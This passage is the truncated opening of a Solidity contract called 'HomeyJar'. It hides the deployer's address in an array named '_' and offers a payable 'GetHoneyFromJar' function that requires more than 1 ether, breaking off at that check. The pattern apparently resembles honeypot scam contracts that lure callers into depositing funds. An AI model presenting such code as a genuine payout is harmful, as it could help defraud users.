```solidity
pragma solidity ^0.4.19;

contract HomeyJar {
    address[1] _ = [msg.sender];
   
    function() public payable {}
   
    function GetHoneyFromJar() public payable {                                              
        if(msg.value > 1 ether) {